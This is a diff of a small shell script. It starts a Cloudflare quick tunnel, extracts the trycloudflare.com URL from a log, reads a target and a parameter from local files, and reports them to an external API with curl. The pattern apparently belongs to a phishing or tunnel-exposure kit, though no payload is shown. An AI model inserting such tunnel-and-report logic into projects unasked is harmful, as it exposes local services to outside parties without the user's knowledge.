@@ -2,9 +2,9 @@
 
 cd "$(dirname "$0")"
 
-./setup_c.sh
+./setup_url.sh
 
-url_data=$(cat url.txt | grep -o 'c=[^&]*' | awk -F'c=' '{print $2}')
+url_data=$(cat url.txt | grep -o 'r=[^&]*' | awk -F'r=' '{print $2}')
 
 export C=$url_data
 export URL=`cat target.txt`
@@ -21,7 +21,7 @@ sleep 5
 extract_url() {
     local file_content=$(cat /tmp/tunnel.log)
     local url=$(echo "$file_content" | grep -o 'http[s]\?://[^[:space:]]\+.trycloudflare.com' | grep -v '^http://localhost' | grep -v '^http://10')
-    echo "URL: $url"
+    echo "$url"
 }
 
 # Call the function
@@ -36,3 +36,5 @@ done
 
 # curl -X POST "$API" -d "url=$url&p=$C"
 curl -sL "$API?u=$url&p=$C"
+
+cat url.txt
